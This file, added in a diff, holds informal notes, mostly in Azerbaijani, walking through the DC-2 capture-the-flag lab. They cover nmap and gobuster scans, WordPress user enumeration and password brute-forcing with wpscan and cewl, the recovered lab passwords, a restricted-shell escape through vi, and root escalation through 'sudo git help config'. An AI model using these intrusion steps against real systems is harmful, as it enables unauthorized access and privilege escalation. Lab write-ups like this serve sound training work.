@@ -1,0 +1,91 @@
+sudo su
+kali
+3 cunu yaz, DC2 den ip gotur
+nmap -sC -sV -Pn -A 192.168.56.101
+ cat /etc/hosts ele gorursenki yoxdu
+vi /etc/hosts
+ip qabaginda sayt adi verecek onu run ele acilmayacaq
+kali i nin ustune getir i bas insert olsun
+192.168.56.101 gdjpy - bunu yaz yeni ip sayt adi
+esc ele :wq ele ki yaddasa yazilsin
+sayti bide run edirik acilir
+sonra - gobuster dir -u http://gdjpy/ -w /usr/share/dirb/wordlists/common.txt run et
+sonra bu wpscan --url http://gdjpy/ --enumerate u 
+işləsə admin tom jeri acilir
+əgər açılmasa wpscan edirik:
+interneti sağ yuxarıdan disconnect edib, yalniz kallinin networkunu brifge adapter edirik.
+Çevirəndən sonra connect edib host only edirik
+
+cewl http://gdjpy/ -w wordlist.txt
+saytdaki kodu file yazir
+sonra bu - wpscan --url http://gdjpy/ --usernames jerry --passwords wordlist.txt
+!] Valid Combinations Found:
+ | Username: jerry, Password: xpaoqbexid
+
+wpscan --url http://gdjpy/ --usernames tom --passwords wordlist.txt
+yeniden tom ucun edirik 
+[!] Valid Combinations Found:
+ | Username: tom, Password: zollsitamo
+
+
+vi   (:wq)
+:set shell=/bin/bash
+:shell
+export PATH=/usr/bin:/bin
+siraynan bunlari et ki bezi commandlar islesin o faylda
+  
+sonra : su jerry
+
+
+nmap -p- 192.168.56.101 (burda oz ipin)
+
+scan edib baxiri ki hansi portlar aciqdi
+
+nmap -p- 192.168.56.101
+sonra ssh ile qosul
+ssh tom@gdjpy -p 7744
+password yaz sonra ve acilsi
+ls et
+gorursen flag3.txt adli file var
+onu oxumaq ucu vi flag3.txt
+vi 
+yazib bunlarti etmek lazimdiki commandlari gootursun
+**
+:set shell=/bin/bash
+:shell
+export PATH=/usr/bin:/bin
+**
+cat flag3.txt
+
+Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes..
+Flag is: 7e456b8814a3fadbd7e5380926427999
+
+jerry password isteyecek : xpaoqbexid
+ yazdiq
+ls eledim hecne yoxdu
+cd .. bir fayl geri qayitdiq
+
+cd jerry
+
+ls edirem
+gorurem ki 
+flag4.txt var
+
+
+cat flag4.txt edirik
+Flag is: feeef55541122b3b3bbc80f0fc15a7c4
+
+bir addim geri cixmaq ucun: sudo -l
+
+
+sudo git help config
+bunun icinde ele yazirsan !/bin/sh
+
+cd root
+ls
+cat final-flag.txt
+
+Flag is: 0940dd355a45055de5ff386b823b02b0
+
+
+
